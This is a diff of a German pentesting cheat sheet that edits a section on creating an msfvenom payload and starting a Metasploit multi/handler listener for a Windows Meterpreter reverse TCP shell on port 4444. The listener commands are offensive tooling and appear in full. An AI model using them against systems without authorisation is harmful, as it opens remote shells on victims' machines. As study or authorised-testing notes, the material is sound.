@@ -25,19 +25,17 @@
 
 ## Linux:
 
----
-
 - Payload erstellen: msfvenom
-- Meterpreter sitzung Listener:
+- Meterpreter Listener bereitstellen:
 
 ```bash
 msfconsole
-msf6> use exploit/multi/handler
-msf6> set PAYLOAD windows/x64/meterpreter/reverse_tcp
-msf6> set LHOST <kali IP>
-msf6> set LPORT 4444
-msf6> set ExitOnSession false
-msf6> exploit -j
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST <kali IP>
+set LPORT 4444
+set ExitOnSession false
+exploit -j
 ````
 
 ---
